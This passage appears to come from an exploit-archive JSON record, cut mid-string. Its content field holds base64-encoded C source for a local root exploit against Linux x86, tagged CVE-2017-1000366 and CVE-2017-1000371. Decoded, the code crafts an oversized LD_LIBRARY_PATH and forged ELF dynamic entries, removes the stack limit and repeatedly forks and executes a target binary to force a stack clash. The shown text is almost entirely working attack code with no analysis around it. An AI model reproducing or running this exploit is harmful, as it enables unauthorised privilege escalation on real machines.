250LCBkc3Q7DQogICAgfSBiZXN0Ow0KDQogICAgI2RlZmluZSBMTFAgIkxEX0xJQlJBUllfUEFUSD0iDQogICAgc3RhdGljIGNoYXIgbGxwW01BWF9BUkdfU1RSTEVOXTsNCiAgICAjZGVmaW5lIE1BWF9HV1IgKHNpemVvZihsbHApIC0gc2l6ZW9mKExMUCkpDQogIHsNCiAgICBzaXplX3QgbGVuOw0KICAgIGZvciAobGVuID0gTUFYX0dXUjsgbGVuID49IEFMSUdOOyBsZW4gLT0gQUxJR04pIHsNCiAgICAgICAgc2l6ZV90IGd3cjsNCiAgICAgICAgZm9yIChnd3IgPSBsZW47IGd3ciA+PSBlbGYuZHluX2VuZCAtIGVsZi5keW5fc3RhcnQ7IGd3ci0tKSB7DQogICAgICAgICAgICBzaXplX3QgZHN0Ow0KICAgICAgICAgICAgZm9yIChkc3QgPSAwOyBkc3QgPCBzaXplb2YoRFNUcykvc2l6ZW9mKCpEU1RzKTsgZHN0KyspIHsNCiAgICAgICAgICAgICAgICBjb25zdCBzaXplX3QgY250ID0gKGxlbiAtIGd3cikgLyAoMSArIERTVHNbZHN0XS5sZW4gKyAxKTsNCiAgICAgICAgICAgICAgICBjb25zdCBzaXplX3QgZ3BqID0gKGxlbiArICgocmVwbF9tYXggPiA0KSA/IChjbnQgKiAocmVwbF9tYXggLSA0KSkgOiAwKSArIDEgKyAoQUxJR04tMSkpICYgfihBTElHTi0xKTsNCiAgICAgICAgICAgICAgICBjb25zdCBzaXplX3QgYndyID0gY250ICogKERTVHNbZHN0XS5yZXBsX2xlbiArIDEpICsgKChsZW4gLSBnd3IpIC0gY250ICogKDEgKyBEU1RzW2RzdF0ubGVuICsgMSkpICsgMTsNCg0KICAgICAgICAgICAgICAgIGlmIChnd3IgKyBid3IgPj0gZWxmLm1hcF9lbmQgLSBlbGYuZHluX3N0YXJ0KSBjb250aW51ZTsNCiAgICAgICAgICAgICAgICBjb25zdCBzaXplX3QgbWluID0gTUlOKGd3ciwgZWxmLmR5bl9lbmQgLSBlbGYubWFwX3N0YXJ0KTsNCiAgICAgICAgICAgICAgICBpZiAoZ3BqIDw9IG1pbiArIChlbGYubWFwX2VuZCAtIGVsZi5keW5fZW5kKSArIDMgKiBQQUdFU1opIGNvbnRpbnVlOw0KDQogICAgICAgICAgICAgICAgY29uc3QgZG91YmxlIHByb2JhYmlsaXR5ID0gKGRvdWJsZSltaW4gLyAoZG91YmxlKShQSUVfUkFORCArIFNUQUNLX1JBTkQpOw0KICAgICAgICAgICAgICAgIGlmIChiZXN0LnByb2JhYmlsaXR5IDwgcHJvYmFiaWxpdHkpIHsNCiAgICAgICAgICAgICAgICAgICAgYmVzdC5wcm9iYWJpbGl0eSA9IHByb2JhYmlsaXR5Ow0KICAgICAgICAgICAgICAgICAgICBiZXN0LmxlbiA9IGxlbjsNCiAgICAgICAgICAgICAgICAgICAgYmVzdC5nd3IgPSBnd3I7DQogICAgICAgICAgICAgICAgICAgIGJlc3QuY250ID0gY250Ow0KICAgICAgICAgICAgICAgICAgICBiZXN0LmRzdCA9IGRzdDsNCiAgICAgICAgICAgICAgICAgICAgcHJpbnRmKCJsZW4gJXp1IGdwaiAlenUgZ3dyICV6dSBid3IgJXp1IGNudCAlenUgZHN0ICV6dSByZXBsICV6dSBwcm9iYWJpbGl0eSAxLyV6dSAoJS4xMGcpXG4iLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxlbiwgZ3BqLCBnd3IsIGJ3ciwgY250LCBEU1RzW2RzdF0ubGVuLCBEU1RzW2RzdF0ucmVwbF9sZW4sIChzaXplX3QpKDEgLyBwcm9iYWJpbGl0eSksIHByb2JhYmlsaXR5KTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQogIH0NCiAgICBpZiAoIWJlc3QucHJvYmFiaWxpdHkpIGRpZSgpOw0KICAgIGlmIChTVEFDS19CQVNFIDw9IFBJRV9CQVNFKSBkaWUoKTsNCiAgICBjb25zdCBzaXplX3Qgc3RhY2tfc2l6ZSA9IChTVEFDS19CQVNFIC0gUElFX0JBU0UpIC0gKFBJRV9SQU5ELzIgKyBlbGYubWFwX2VuZCArIFNUQUNLX1JBTkQvMik7DQogICAgcHJpbnRmKCJzdGFja19zaXplICV6dVxuIiwgc3RhY2tfc2l6ZSk7DQoNCiAgICAjZGVmaW5lIFNUUlRBQl9TSVpFICgyICogU1RBQ0tfUkFORCkNCiAgICAjZGVmaW5lIE5FRURFRCAiLi8zNDU2Nzg5YWJjZGVmIg0KICAgIGlmIChzaXplb2YoTkVFREVEKSAhPSBBTElHTikgZGllKCk7DQogICAgc3RhdGljIHVuaW9uIHsNCiAgICAgICAgdWludHB0cl90IHA7DQogICAgICAgIGNoYXIgc1tzaXplb2Yodm9pZCAqKV07DQogICAgfSBzdHJ0YWJfYWRkcjsNCiAgew0KICAgIHN0YXRpYyBjb25zdCBFbGZXKER5bikgZHluOw0KICAgIGlmIChzaXplb2Yoc3RydGFiX2FkZHIpICE9IHNpemVvZihkeW4uZF91bikpIGRpZSgpOw0KICAgIGlmIChzaXplb2Yoc3RydGFiX2FkZHIucCkgIT0gc2l6ZW9mKGR5bi5kX3VuKSkgZGllKCk7DQogICAgaWYgKHNpemVvZihzdHJ0YWJfYWRkci5zKSAhPSBzaXplb2YoZHluLmRfdW4pKSBkaWUoKTsNCiAgfQ0KICB7DQogICAgdWludHB0cl90IG5lZWRlZF9hZGRyID0gU1RBQ0tfQkFTRSAtIFNUQUNLX1JBTkQvMiAtIFNUUlRBQl9TSVpFLzI7DQogICAgY29uc3QgdWludHB0cl90IGZpcnN0X25lZWRlZF9hZGRyID0gbmVlZGVkX2FkZHI7DQogICAgZm9yICg7OyBuZWVkZWRfYWRkciArPSBzaXplb2YoTkVFREVEKSkgew0KICAgICAgICBpZiAobmVlZGVkX2FkZHIgJSBzaXplb2YoTkVFREVEKSkgZGllKCk7DQogICAgICAgIHN0cnRhYl9hZGRyLnAgPSBuZWVkZWRfYWRkciAvIDI7DQogICAgICAgIHNpemVfdCBpOw0KICAgICAgICBmb3IgKGkgPSAwOyBpIDwgc2l6ZW9mKHN0cnRhYl9hZGRyLnMpOyBpKyspIHsNCiAgICAgICAgICAgIGlmIChzdHJjaHIoIiQ6O1xcIiwgc3RydGFiX2FkZHIuc1tpXSkpIHsNCiAgICAgICAgICAgICAgICBpZiAoaSA+PSAzKSBkaWUoKTsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBpZiAoaSA+PSBzaXplb2Yoc3RydGFiX2FkZHIucykpIGJyZWFrOw0KICAgIH0NCiAgICBwcmludGYoIm5lZWRlZCAlMDh4IC0+ICUwOHggKGZpcnN0ICUwOHggLT4gJTA4eClcbiIsDQogICAgICAgICAgICBuZWVkZWRfYWRkciwgc3RydGFiX2FkZHIucCwgZmlyc3RfbmVlZGVkX2FkZHIsDQogICAgICAgICAgICBuZWVkZWRfYWRkciAtIGZpcnN0X25lZWRlZF9hZGRyKTsNCiAgICBpZiAobmVlZGVkX2FkZHIgPCBmaXJzdF9uZWVkZWRfYWRkcikgZGllKCk7DQogICAgaWYgKG5lZWRlZF9hZGRyIC0gZmlyc3RfbmVlZGVkX2FkZHIgPj0gU1RBQ0tfUkFORCAvIDQpIGRpZSgpOw0KICB9DQogICAgI2RlZmluZSBJTklUSUFMX1NUQUNLX0VYUEFOU0lPTiAoMTMxMDcyVUwpDQogICAgY29uc3Qgc2l6ZV90IG5lZWRlZF9lbnZzID0gU1RSVEFCX1NJWkUgLyBzaXplb2YoTkVFREVEKTsNCiAgICBpZiAobmVlZGVkX2VudnMgPCBJTklUSUFMX1NUQUNLX0VYUEFOU0lPTiAvIHNpemVvZihjaGFyICopKSBkaWUoKTsNCg0KICAgIHN0YXRpYyBjaGFyIGNsYXNoW01BWF9BUkdfU1RSTEVOXTsNCiAgICBtZW1zZXQoY2xhc2gsICcgJywgc2l6ZW9mKGNsYXNoKS0xKTsNCiAgICBpZiAoKHN0cmxlbihjbGFzaCkgKyAxKSAlIEFMSUdOKSBkaWUoKTsNCiAgICBjb25zdCBzaXplX3QgY2xhc2hfZW52cyA9IChzdGFja19zaXplIC0gc2l6ZW9mKGxscCkgLSBuZWVkZWRfZW52cyAqIChzaXplb2YoY2hhciAqKSArIHNpemVvZihORUVERUQpKSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8gKHNpemVvZihjaGFyICopICsgc2l6ZW9mKGNsYXNoKSk7DQogICAgcHJpbnRmKCIjbmVlZGVkICV6dSAjY2xhc2ggJXp1XG4iLCBuZWVkZWRfZW52cywgY2xhc2hfZW52cyk7DQoNCiAgew0KICAgIGNoYXIgKiBjcCA9IG1lbXBjcHkobGxwLCBMTFAsIHNpemVvZihMTFApLTEpOw0KICAgIG1lbXNldChjcCwgJy8nLCBiZXN0Lmxlbik7DQogICAgY29uc3QgY2hhciAqIGNvbnN0IGJ3cnAgPSBjcCArIGJlc3QuZ3dyOw0KICAgIGNwICs9IGVsZi5keW5fc3RhcnQgJSBBTElHTjsNCiAgICBpZiAoY3AgPj0gYndycCkgZGllKCk7DQogICB7DQogICAgc3RhdGljIGNvbnN0IEVsZlcoRHluKSBkeW47DQogICAgZm9yICg7IGJ3cnAgLSBjcCA+PSAocHRyZGlmZl90KXNpemVvZihkeW4pOyBjcCArPSBzaXplb2YoZHluKSkgew0KICAgICAgICBFbGZXKER5bikgKiBjb25zdCBkeW5wID0gKHZvaWQgKiljcDsNCiAgICAgICAgZHlucC0+ZF90YWcgPSBEVF9BVVhJTElBUlk7DQogICAgICAgIGR5bnAtPmRfdW4uZF9wdHIgPSBzdHJ0YWJfYWRkci5wOw0KICAgIH0NCiAgIH0NCiAgICBpZiAoY3AgPiBid3JwKSBkaWUoKTsNCiAgICBjcCA9IChjaGFyICopYndycDsNCiAgICBpZiAoIWJlc3QuY250KSBkaWUoKTsNCiAgICBpZiAoYmVzdC5kc3QgPj0gc2l6ZW9mKERTVHMpL3NpemVvZigqRFNUcykpIGRpZSgpOw0KICAgIHNpemVfdCBpOw0KICAgIGZvciAoaSA9IDA7IGkgPCBiZXN0LmNudDsgaSsrKSB7DQogICAgICAgICpjcCsrID0gJyQnOw0KICAgICAgICBjcCA9IG1lbXBjcHkoY3AsIERTVHNbYmVzdC5kc3RdLnN0ciwgRFNUc1tiZXN0LmRzdF0ubGVuKTsNCiAgICAgICAgKmNwKysgPSAnLyc7DQogICAgfQ0KICAgIGlmIChjcCA+PSBsbHAgKyBzaXplb2YobGxwKSkgZGllKCk7DQogICAgaWYgKChzdHJsZW4obGxwKSArIDEpICUgQUxJR04pIGRpZSgpOw0KICAgIGlmICgoc3RybGVuKGxscCkgKyAxKSAhPSBzaXplb2YoTExQKSArIGJlc3QubGVuKSBkaWUoKTsNCiAgfQ0KDQogICAgI2RlZmluZSBMSENNICJMRF9IV0NBUF9NQVNLPSINCiAgICBzdGF0aWMgY2hhciBsaGNtWzY0XTsNCiAgew0KICAgIGNvbnN0IGludCB3aWR0aCA9IEFMSUdOIC0gKHNpemVvZihMSENNKSArIHN0cmxlbihiaW5hcnkpICsgMSArIHNpemVvZih2b2lkICopKSAlIEFMSUdOOw0KICAgIGlmICh3aWR0aCA8PSAwKSBkaWUoKTsNCiAgICBpZiAoKHVuc2lnbmVkIGludCl3aWR0aCA+IEFMSUdOKSBkaWUoKTsNCiAgICBpZiAoKHVuc2lnbmVkIGludClzbnByaW50ZihsaGNtLCBzaXplb2YobGhjbSksICIlcyUwKnUiLCBMSENNLCB3aWR0aCwgMCkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA+PSBzaXplb2YobGhjbSkpIGRpZSgpOw0KICAgIGlmIChzdHJsZW4obGhjbSkgKyAxICE9IHNpemVvZihMSENNKSArIHdpZHRoKSBkaWUoKTsNCiAgfQ0KDQogICAgY29uc3Qgc2l6ZV90IGFyZ3MgPSAyICsgY2xhc2hfZW52cyArIG5lZWRlZF9lbnZzICsgMTsNCiAgICBjaGFyICoqIGNvbnN0IGFyZ3YgPSBjYWxsb2MoYXJncywgc2l6ZW9mKGNoYXIgKikpOw0KICAgIGlmICghYXJndikgZGllKCk7DQogIHsNCiAgICBjaGFyICoqIGFwID0gYXJndjsNCiAgICAqYXArKyA9IChjaGFyICopYmluYXJ5Ow0KICAgICphcCsrID0gIi0taGVscCI7DQogICAgc2l6ZV90IGk7DQogICAgZm9yIChpID0gMDsgaSA8IGNsYXNoX2VudnM7IGkrKykgew0KICAgICAgICAqYXArKyA9IGNsYXNoOw0KICAgIH0NCiAgICBmb3IgKGkgPSAwOyBpIDwgbmVlZGVkX2VudnM7IGkrKykgew0KICAgICAgICAqYXArKyA9IE5FRURFRDsNCiAgICB9DQogICAgKmFwKysgPSBOVUxMOw0KICAgIGlmIChhcCAhPSBhcmd2ICsgYXJncykgZGllKCk7DQogIH0NCg0KICAgIGNvbnN0IHNpemVfdCBlbnZzID0gMSArIDI7DQogICAgY2hhciAqKiBjb25zdCBlbnZwID0gY2FsbG9jKGVudnMsIHNpemVvZihjaGFyICopKTsNCiAgICBpZiAoIWVudnApIGRpZSgpOw0KICB7DQogICAgY2hhciAqKiBlcCA9IGVudnA7DQogICAgKmVwKysgPSBsbHA7DQogICAgKmVwKysgPSBsaGNtOw0KICAgICplcCsrID0gTlVMTDsNCiAgICBpZiAoZXAgIT0gZW52cCArIGVudnMpIGRpZSgpOw0KICB9DQoNCiAgew0KICAgIHN0YXRpYyBjb25zdCBzdHJ1Y3QgcmxpbWl0IHJsaW1pdF9zdGFjayA9IHsgUkxJTV9JTkZJTklUWSwgUkxJTV9JTkZJTklUWSB9Ow0KICAgIGlmIChzZXRybGltaXQoUkxJTUlUX1NUQUNLLCAmcmxpbWl0X3N0YWNrKSkgZGllKCk7DQogIH0NCiAgICBpbnQgcGlwZWZkWzJdOw0KICAgIGlmIChwaXBlKHBpcGVmZCkpIGRpZSgpOw0KICAgIGlmIChjbG9zZShwaXBlZmRbMF0pKSBkaWUoKTsNCiAgICBwaXBlZmRbMF0gPSAtMTsNCiAgICBpZiAoc2lnbmFsKFNJR1BJUEUsIFNJR19ERkwpID09IFNJR19FUlIpIGRpZSgpOw0KDQogICAgY3JlYXRlX25lZWRlZF9saWIoTkVFREVEKTsNCg0KICAgIHNpemVfdCB0cnk7DQogICAgZm9yICh0cnkgPSAxOyB0cnkgPD0gNjU1MzY7IHRyeSsrKSB7DQogICAgICAgIGlmIChmZmx1c2goc3Rkb3V0KSkgZGllKCk7DQogICAgICAgIGNvbnN0IHBpZF90IHBpZCA9IGZvcmsoKTsNCiAgICAgICAgaWYgKHBpZCA8PSAtMSkgZGllKCk7DQogICAgICAgIGlmIChwaWQgPT0gMCkgew0KICAgICAgICAgICAgaWYgKGR1cDIocGlwZWZkWzFdLCAxKSAhPSAxKSBkaWUoKTsNCiAgICAgICAgICAgIGlmIChkdXAyKHBpcGVmZFsxXSwgMikgIT0gMikgZGllKCk7DQogICAgICAgICAgICBleGVjdmUoKmFyZ3YsIGFyZ3YsIGVudnApOw0KICAgICAgICAgICAgZGllKCk7DQogICAgICAgIH0NCiAgICAgICAgaW50IHN0YXR1cyA9IDA7DQogICAgICAgIHN0cnVjdCB0aW1ldmFsIHN0YXJ0LCBzdG9wLCBkaWZmOw0KICAgICAgICBpZiAoZ2V0dGltZW9mZGF5KCZzdGFydCwgTlVMTCkpIGRpZSgpOw0KICAgICAgICBpZiAod2FpdHBpZChwaWQsICZzdGF0dXMsIFdVTlRSQUNFRCkgIT0gcGlkKSBkaWUoKTsNCiAgICAgICAgaWYgKGdldHRpbWVvZmRheSgmc3RvcCwgTlVMTCkpIGRpZSgpOw0KICAgICAgICB0aW1lcnN1Yigmc3RvcCwgJnN0YXJ0LCAmZGlmZik7DQogICAgICAgIHByaW50ZigidHJ5ICV6dSAlbGQuJTA2bGQgIiwgdHJ5LCBkaWZmLnR2X3NlYywgZGlmZi50dl91c2VjKTsNCg0KICAgICAgICBpZiAoV0lGU0lHTkFMRUQoc3RhdHVzKSkgew0KICAgICAgICAgICAgcHJpbnRmKCJzaWduYWwgJWRcbiIsIFdURVJNU0lHKHN0YXR1cykpOw0KICAgICAgICAgICAgc3dpdGNoIChXVEVSTVNJRyhzdGF0dXMpKSB7DQogICAgICAgICAgICAgICAgY2FzZSBTSUdQSVBFOg0KICAgICAgICAgICAgICAgIGNhc2UgU0lHU0VHVjoNCiAgICAgICAgICAgICAgICBjYXNlIFNJR0JVUzoNCiAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgZGVmYXVsdDoNCiAgICAgICAgICAgICAgICAgICAgZGllKCk7DQogICAgICAgICAgICB9DQogICAgICAgIH0gZWxzZSBpZiAoV0lGRVhJVEVEKHN0YXR1cykpIHsNCiAgICAgICAgICAgIHByaW50ZigiZXhpdGVkICVkXG4iLCBXRVhJVFNUQVRVUyhzdGF0dXMpKTsNCiAgICAgICAgfSBlbHNlIGlmIChXSUZTVE9QUEVEKHN0YXR1cykpIHsNCiAgICAgICAgICAgIHByaW50Zigic3RvcHBlZCAlZFxuIiwgV1NUT1BTSUcoc3RhdHVzKSk7DQogICAgICAgICAgICBkaWUoKTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIHByaW50ZigidW5rbm93biAlZFxuIiwgc3RhdHVzKTsNCiAgICAgICAgICAgIGRpZSgpOw0KICAgICAgICB9DQogICAgfQ0KICAgIGRpZSgpOw0KfQ==", 
    "filename": "platforms/lin_x86/local/42276.c", 
    "id": "42276", 
    "cves": [
        "CVE-2017-1000366", 
        "CVE-2017-1000371"
    ]
}